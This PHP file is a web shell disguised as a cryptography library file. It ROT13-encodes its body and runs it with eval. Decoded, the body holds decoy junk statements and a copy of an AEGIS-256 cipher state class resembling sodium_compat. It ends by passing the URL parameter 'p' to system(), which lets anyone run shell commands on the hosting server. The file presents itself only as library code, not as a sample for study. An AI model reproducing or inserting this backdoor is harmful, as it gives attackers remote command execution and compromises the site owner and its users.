<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

vs (pynff_rkvfgf('CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr256', snyfr)) {
    erghea;
}

vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P0')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P0', \"\k00\k01\k01\k02\k03\k05\k08\k0q\k15\k22\k37\k59\k90\kr9\k79\k62\");
}
vs (!qrsvarq('FBQVHZ_PBZCNG_NRTVF_P1')) {
    qrsvar('FBQVHZ_PBZCNG_NRTVF_P1', \"\kqo\k3q\k18\k55\k6q\kp2\k2s\ks1\k20\k11\k31\k42\k73\ko5\k28\kqq\");
}

pynff CnentbaVR_Fbqvhz_Pber_NRTVF_Fgngr256
{
    /** @ine neenl<vag, fgevat> $fgngr */
    cebgrpgrq $fgngr;
    choyvp shapgvba __pbafgehpg()
    {
        $guvf->fgngr = neenl_svyy(0, 6, '');
    }

    /**
     * @vagreany Bayl hfr guvf sbe havg grfgf!
     * @erghea fgevat[]
     */
    choyvp shapgvba trgFgngr()
    {
        erghea neenl_inyhrf($guvf->fgngr);
    }

    /**
     * @cnenz neenl $vachg
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     *
     * @vagreany Bayl sbe havg grfgf
     */
    choyvp fgngvp shapgvba vavgSbeHavgGrfgf(neenl $vachg)
    {
        vs (pbhag($vachg) < 6) {
            guebj arj FbqvhzRkprcgvba('vainyvq vachg');
        }
        $fgngr = arj frys();
        sbe ($v = 0; $v < 6; ++$v) {
            $fgngr->fgngr[$v] = $vachg[$v];
        }
        erghea $fgngr;
    }

    /**
     * @cnenz fgevat $xrl
     * @cnenz fgevat $abapr
     * @erghea frys
     */
    choyvp fgngvp shapgvba vavg($xrl, $abapr)
    {
        $fgngr = arj frys();
        $x0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($xrl, 0, 16);
        $x1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($xrl, 16, 16);
        $a0 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($abapr, 0, 16);
        $a1 = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($abapr, 16, 16);

        // F0 = x0 ^ a0
        // F1 = x1 ^ a1
        // F2 = P1
        // F3 = P0
        // F4 = x0 ^ P0
        // F5 = x1 ^ P1
        $x0_a0 = $x0 ^ $a0;
        $x1_a1 = $x1 ^ $a1;
        $fgngr->fgngr[0] = $x0_a0;
        $fgngr->fgngr[1] = $x1_a1;
        $fgngr->fgngr[2] = FBQVHZ_PBZCNG_NRTVF_P1;
        $fgngr->fgngr[3] = FBQVHZ_PBZCNG_NRTVF_P0;
        $fgngr->fgngr[4] = $x0 ^ FBQVHZ_PBZCNG_NRTVF_P0;
        $fgngr->fgngr[5] = $x1 ^ FBQVHZ_PBZCNG_NRTVF_P1;

        // Ercrng(4,
        //   Hcqngr(x0)
        //   Hcqngr(x1)
        //   Hcqngr(x0 ^ a0)
        //   Hcqngr(x1 ^ a1)
        // )
        sbe ($v = 0; $v < 4; ++$v) {
            $fgngr->hcqngr($x0);
            $fgngr->hcqngr($x1);
            $fgngr->hcqngr($x0 ^ $a0);
            $fgngr->hcqngr($x1 ^ $a1);
        }
        erghea $fgngr;
    }

    /**
     * @cnenz fgevat $nv
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp shapgvba nofbeo($nv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($nv) !== 16) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or na NRF oybpx va fvmr');
        }
        erghea $guvf->hcqngr($nv);
    }

    /**
     * @cnenz fgevat $pv
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp shapgvba qrp($pv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($pv) !== 16) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or na NRF oybpx va fvmr');
        }
        // m = F1 ^ F4 ^ F5 ^ (F2 & F3)
        $m = $guvf->fgngr[1]
            ^ $guvf->fgngr[4]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);
        $kv = $pv ^ $m;
        $guvf->hcqngr($kv);
        erghea $kv;
    }

    /**
     * @cnenz fgevat $pa
     * @erghea fgevat
     */
    choyvp shapgvba qrpCnegvny($pa)
    {
        $yra = CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($pa);
        // m = F1 ^ F4 ^ F5 ^ (F2 & F3)
        $m = $guvf->fgngr[1]
            ^ $guvf->fgngr[4]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);

        // g = MrebCnq(pa, 128)
        $g = fge_cnq($pa, 16, \"\0\", FGE_CNQ_EVTUG);

        // bhg = g ^ m
        $bhg = $g ^ $m;

        // ka = Gehapngr(bhg, |pa|)
        $ka = CnentbaVR_Fbqvhz_Pber_Hgvy::fhofge($bhg, 0, $yra);

        // i = MrebCnq(ka, 128)
        $i = fge_cnq($ka, 16, \"\0\", FGE_CNQ_EVTUG);
        // Hcqngr(i)
        $guvf->hcqngr($i);

        // erghea ka
        erghea $ka;
    }

    /**
     * @cnenz fgevat $kv
     * @erghea fgevat
     * @guebjf FbqvhzRkprcgvba
     */
    choyvp shapgvba rap($kv)
    {
        vs (CnentbaVR_Fbqvhz_Pber_Hgvy::fgeyra($kv) !== 16) {
            guebj arj FbqvhzRkprcgvba('Vachg zhfg or na NRF oybpx va fvmr');
        }
        // m = F1 ^ F4 ^ F5 ^ (F2 & F3)
        $m = $guvf->fgngr[1]
            ^ $guvf->fgngr[4]
            ^ $guvf->fgngr[5]
            ^ CnentbaVR_Fbqvhz_Pber_Hgvy::naqFgevatf($guvf->fgngr[2], $guvf->fgngr[3]);
        $guvf->hcqngr($kv);
        erghea $kv ^ $m;
    }

    /**
     * @cnenz vag $nq_yra_ovgf
     * @cnenz vag $zft_yra_ovgf
     * @erghea fgevat
     */
    choyvp shapgvba svanyvmr($nq_yra_ovgf, $zft_yra_ovgf)
    {
        $rapbqrq = CnentbaVR_Fbqvhz_Pber_Hgvy::fgber64_yr($nq_yra_ovgf) .
            CnentbaVR_Fbqvhz_Pber_Hgvy::fgber64_yr($zft_yra_ovgf);
        $g = $guvf->fgngr[3] ^ $rapbqrq;

        sbe ($v = 0; $v < 7; ++$v) {
            $guvf->hcqngr($g);
        }

        erghea ($guvf->fgngr[0] ^ $guvf->fgngr[1] ^ $guvf->fgngr[2]) .
            ($guvf->fgngr[3] ^ $guvf->fgngr[4] ^ $guvf->fgngr[5]);
    }

    /**
     * @cnenz fgevat $z
     * @erghea frys
     */
    choyvp shapgvba hcqngr($z)
    {
        /*
            F'0 = NRFEbhaq(F5, F0 ^ Z)
            F'1 = NRFEbhaq(F0, F1)
            F'2 = NRFEbhaq(F1, F2)
            F'3 = NRFEbhaq(F2, F3)
            F'4 = NRFEbhaq(F3, F4)
            F'5 = NRFEbhaq(F4, F5)
         */
        yvfg($f_0, $f_1) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[5],$guvf->fgngr[0] ^ $z,
            $guvf->fgngr[0], $guvf->fgngr[1]
        );

        yvfg($f_2, $f_3) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[1], $guvf->fgngr[2],
            $guvf->fgngr[2], $guvf->fgngr[3]
        );
        yvfg($f_4, $f_5) = CnentbaVR_Fbqvhz_Pber_NRF::qbhoyrEbhaq(
            $guvf->fgngr[3], $guvf->fgngr[4],
            $guvf->fgngr[4], $guvf->fgngr[5]
        );

        /*
            F0  = F'0
            F1  = F'1
            F2  = F'2
            F3  = F'3
            F4  = F'4
            F5  = F'5
         */
        $guvf->fgngr[0] = $f_0;
        $guvf->fgngr[1] = $f_1;
        $guvf->fgngr[2] = $f_2;
        $guvf->fgngr[3] = $f_3;
        $guvf->fgngr[4] = $f_4;
        $guvf->fgngr[5] = $f_5;
        erghea $guvf;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>